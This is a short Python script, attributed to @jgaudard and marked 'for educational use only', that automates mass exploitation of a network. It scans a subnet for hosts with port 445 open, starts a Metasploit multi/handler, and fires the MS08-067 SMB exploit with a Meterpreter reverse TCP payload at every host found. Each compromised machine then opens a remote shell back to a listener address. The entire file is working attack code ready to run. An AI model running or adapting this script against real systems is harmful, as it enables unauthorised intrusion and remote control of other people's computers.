#!/usr/bin/python

### Created by @jgaudard
### For educational use only
### Version 1.0



import socket as sk
import subprocess, shlex, os, time
 
### Default Variables
targets = []
payload = 'windows/meterpreter/reverse_tcp'
exploit="windows/smb/ms08_067_netapi"
targetfile="hosts.txt"
lhost="172.16.175.100"
lport="443"
net="172.16.175"
netStart=1
netStop=254
 
 
### Scans target network for open port 445
def scanner(net, netStart, netStop):
	print('running scanner')
        for octect in range(netStart,netStop):
                test = net + '.' + str(octect)
                try:
                               
			network = net + '.' + str(octect)
			s=sk.socket(sk.AF_INET, sk.SOCK_STREAM)
			s.settimeout(1)
			s.connect((network, 445))
			targets.append(network)
			s.close
		except: continue
 
### Starts MSF Handler in a new terminal window
def msfhandler():
        print('Starting Handler')
        
        handlerfile = open('handler.rc', 'w')
        handlerfile.write("use exploit/multi/handler\n")
        handlerfile.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
        handlerfile.write("set LHOST {0}\n".format(lhost))
        handlerfile.write("set ExitOnSession false\n")
        handlerfile.write("exploit -j -z\n")
        handlerfile.close()
        
        msfstart = subprocess.Popen(shlex.split('service postgresql start ; service metasploit start'))
        handler = subprocess.Popen(shlex.split('gnome-terminal -x msfconsole -r handler.rc'))
        time.sleep(60)
        os.remove('handler.rc')
 
### the autopwn
def autopwn(targets):
	print('starting to autopwn targets: {0}'.format(targets))
	for target in targets:
		subprocess.Popen(shlex.split('msfcli {0} PAYLOAD={1} RHOST={2} LHOST={3} LPORT={4} DisablePayloadHandler=true E'.format(exploit, payload, target, lhost, lport)))
	del targets[:]  ### Deletes all targets after autopwned
	


msfhandler()
scanner(net, netStart, netStop)
autopwn(targets)

### Examples ###
### Use multiple scanner and autopwn modules to scan and pwn more!
'''
scanner(net, 1, 10)
autopwn(targets)
scanner(net, 11, 50)
autopwn(targets)
scanner(net, 51, 254)
autopwn(targets)
scanner('172.16.175', netStart, netStop)
autopwn(targets)
'''


